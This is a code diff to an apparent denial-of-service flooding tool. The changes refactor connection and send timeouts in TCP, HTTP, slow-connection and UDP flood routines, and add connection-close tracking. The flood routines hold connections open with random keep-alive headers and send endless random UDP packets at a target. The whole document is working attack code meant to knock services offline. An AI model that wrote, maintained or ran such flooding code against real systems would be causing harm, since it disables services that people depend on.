@@ -1,6 +1,7 @@
 import aiohttp
 import aiohttp_socks
 import asyncio
+from async_timeout import timeout
 
 from contextlib import suppress
 from copy import copy
@@ -669,10 +670,25 @@ class AsyncTcpFlood(HttpFlood):
             conn = asyncio.open_connection(
                 host=self._target.host, port=self._target.port, ssl=ssl_ctx,
                 server_hostname=server_hostname)
-        reader, writer = await asyncio.wait_for(
-            conn, timeout=self._settings.connect_timeout_seconds)
+        async with timeout(self._settings.connect_timeout_seconds):
+            reader, writer = await conn
         self._stats.track_open_connection()
         return reader, writer
+
+    def _closed_connection(self, f: asyncio.Future) -> None:
+        # note that we don't shild wait_closed task, which means it might
+        # be canceled. overall, it's hard to make sure that each closed or
+        # non-closed connection would be tracked properly. which is fine,
+        # as we only use this information for display purpose
+        self._stats.track_close_connection()
+        try:
+            # we only need to read this result to avoid asyncio warning
+            # about non-consumed exceptions
+            f.result()
+        except:
+            # XXX: there should be an option to see error
+            #      e.g. TRACE level of logging or something
+            pass
 
     async def _close_connection(self, writer: asyncio.StreamWriter) -> None:
         if writer.can_write_eof():
@@ -682,22 +698,18 @@ class AsyncTcpFlood(HttpFlood):
             self._stats.track_close_connection()
         else:
             writer.close()
-            closed = asyncio.create_task(asyncio.wait_for(
-                writer.wait_closed(), timeout=self._settings.close_timeout_seconds))
-            closed.add_done_callback(lambda _: self._stats.track_close_connection())
-            await closed
+            task = asyncio.create_task(writer.wait_closed())
+            task.add_done_callback(self._closed_connection)
 
     async def _send_packet(self, writer: asyncio.StreamWriter, payload: bytes) -> None:
         if self._settings.low_level_transport:
             sock = writer.get_extra_info("socket")._sock
-            await asyncio.wait_for(
-                self._loop.sock_sendall(sock, payload),
-                timeout=self._settings.drain_timeout_seconds
-            )
+            async with timeout(self._settings.drain_timeout_seconds):
+                await self._loop.sock_sendall(sock, payload),
         else:
             writer.write(payload)
-            await asyncio.wait_for(
-                writer.drain(), timeout=self._settings.drain_timeout_seconds)
+            async with timeout(self._settings.drain_timeout_seconds):
+                await writer.drain()
         self._stats.track(1, len(payload))
 
     async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
@@ -819,9 +831,8 @@ class AsyncTcpFlood(HttpFlood):
                         self._stats.track(1, request_info_size(response.request_info))
                         packets_sent += 1
                         # XXX: we need to track in/out traffic separately
-                        await asyncio.wait_for(
-                            response.read(),
-                            timeout=self._settings.http_response_timeout_seconds)
+                        async with timeout(self._settings.http_response_timeout_seconds):
+                            await response.read()
             finally:
                 self._stats.track_close_connection()
         return packets_sent > 0
@@ -854,8 +865,8 @@ class AsyncTcpFlood(HttpFlood):
                 await self._send_packet(writer, payload)
                 packets_sent += 1
                 # XXX: have to setup buffering properly for this attack to be effective
-                await asyncio.wait_for(
-                    reader.read(1), timeout=self._settings.tcp_read_timeout_seconds)
+                async with timeout(self._settings.tcp_read_timeout_seconds):
+                    await reader.read(1)
         finally:
             await self._close_connection(writer)
         return packets_sent > 0
@@ -891,8 +902,8 @@ class AsyncTcpFlood(HttpFlood):
             while True:
                 await self._send_packet(writer, payload)
                 packets_sent += 1
-                await asyncio.wait_for(
-                    reader.read(1), timeout=self._settings.tcp_read_timeout_seconds)
+                async with timeout(self._settings.tcp_read_timeout_seconds):
+                    await reader.read(1)
                 for i in range(self._settings.requests_per_connection):
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     await self._send_packet(writer, keep)
@@ -914,8 +925,8 @@ class AsyncTcpFlood(HttpFlood):
                 while True:
                     await asyncio.sleep(.01)
                     # XXX: should this be separate setting for config?
-                    data = await asyncio.wait_for(
-                        reader.read(1), timeout=self._settings.tcp_read_timeout_seconds)
+                    async with timeout(self._settings.tcp_read_timeout_seconds):
+                        data = await reader.read(1)
                     if not data: break
                 await self._send_packet(writer, b'0')
         finally:
@@ -949,15 +960,13 @@ class AsyncUdpFlood(Layer4):
     async def UDP(self) -> bool:
         packets_sent, packet_size = 0, 1024
         with socket(AF_INET, SOCK_DGRAM) as sock:
-            await asyncio.wait_for(
-                self._loop.sock_connect(sock, self._target),
-                timeout=self._settings.connect_timeout_seconds)
+            async with timeout(self._settings.connect_timeout_seconds):
+                await self._loop.sock_connect(sock, self._target)
             while True:
                 packet = randbytes(packet_size)
                 try:
-                    await asyncio.wait_for(
-                        self._loop.sock_sendall(sock, packet),
-                        timeout=self._settings.drain_timeout_seconds)
+                    async with timeout(self._settings.drain_timeout_seconds):
+                        await self._loop.sock_sendall(sock, packet)
                 except OSError as exc:
                     if exc.errno == errno.ENOBUFS:
                         await asyncio.sleep(0.5)
